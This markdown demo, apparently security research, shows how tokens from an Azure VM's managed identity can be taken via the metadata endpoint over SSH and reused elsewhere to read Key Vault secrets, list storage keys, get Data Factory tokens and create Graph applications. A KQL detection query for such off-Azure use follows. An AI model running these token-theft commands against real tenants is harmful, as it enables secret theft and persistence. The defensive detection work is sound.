# Read KV with the AT outside the MI

```sh

# KeyVault
at=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at

curl -s "https://$kvName.vault.azure.net/secrets/vmsecret/?api-version=2016-10-01" -H "Authorization: Bearer $at" | jq .


#Storage

at2=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at2

curl -s -d "{}" $storagePath  -H "Authorization: Bearer $at2" | jq .

# Try to storageAccount without permissions

curl -s -d "{}" "https://management.azure.com/subscriptions/3539c2a2-cd25-48c6-b295-14e59334ef1c/resourceGroups/rg-faug/providers/Microsoft.Storage/storageAccounts/faugspoof/listKeys?api-version=2022-09-01" -H "Authorization: Bearer $at2" | jq .

# Try to get Azure Data Factory DataPlane Access Tokens

curl -s -d "{}" "https://management.azure.com/subscriptions/3539c2a2-cd25-48c6-b295-14e59334ef1c/resourcegroups/rg-adf/providers/Microsoft.DataFactory/factories/adftest334/getDataPlaneAccess?api-version=2018-06-01" -H "Authorization: Bearer $at2" | jq .

# Create new SPN as the MI

at3=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at3


curl -s -X POST -H "Content-type: application/json" -H "Authorization: Bearer $at3" -d '{"displayName": "'eastDemo-$RANDOM'"}' https://graph.microsoft.com/v1.0/applications | jq .



```
# Review logs
```sql
let aadAuditLog = AuditLogs
| mv-apply  InitiatedBy to typeof(dynamic ) on (
where isnotempty( InitiatedBy.app)
| extend app =parse_json(InitiatedBy.app).displayName
);
// map MI and SPN to non-identified Azure Ranges
let s = union AADServicePrincipalSignInLogs, AADManagedIdentitySignInLogs
| distinct AppId, ServicePrincipalName;
let massList = s | summarize make_list(AppId);
let src = union AzureDiagnostics, AzureActivity, aadAuditLog 
| extend mass = pack_all(true)
| mv-apply appId = toscalar(massList) to typeof(string) on (where mass contains appId  )
| extend combOp = iff(isempty( OperationNameValue), OperationName, OperationNameValue)
| extend combCategory = iff(isempty( Category), CategoryValue, Category)
| join kind=inner s on $left.appId == $right.AppId
| extend ipByAsIdentifiedByAzure =iff(isempty( CallerIPAddress),CallerIpAddress, CallerIPAddress)
| distinct  ServicePrincipalName,appId, Type, combOp, combCategory, ipByAsIdentifiedByAzure
| summarize make_list(pack_all(true));
let azIp =externaldata(changeNumber: string, cloud: string, values: dynamic)
["https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public_20230424.json"]
with(format='multijson')
| mv-expand values
| project  aId =values.id, prefix =values.properties.addressPrefixes
| mv-expand prefix
| project aId, prefix;
let matched = azIp
| mv-apply src= toscalar(src) to typeof(dynamic) on 
    (
extend matchFound = ipv4_is_in_range(tostring(src.ipByAsIdentifiedByAzure),tostring(prefix)) 
    )
| where matchFound == true
| evaluate bag_unpack(src);
let noMatch = src
| mv-expand list_
| evaluate bag_unpack(list_) 
| extend appId =toguid(appId)
| join kind=leftanti matched on $left.ipByAsIdentifiedByAzure == $right.ipByAsIdentifiedByAzure
| extend matchFound = false;
union noMatch, matched
| extend ipByAsIdentifiedByAzure = iff(isempty(ipByAsIdentifiedByAzure),'IP not in expected field/IP not recorded',ipByAsIdentifiedByAzure) 




```


# finally

joosua@g16-dev:~/bheast$ node ./plugins/main.js --batch=10 --nativescope=true --namespace=resourceGroups/rg-honeyP,rg-eastdemovm9449 --composites --clearTokens --SkipStorageThrottling --scanAuditLogs=20 --composites --clearTokens --SkipStorageThrottling --checkAad; node filterForUg.js 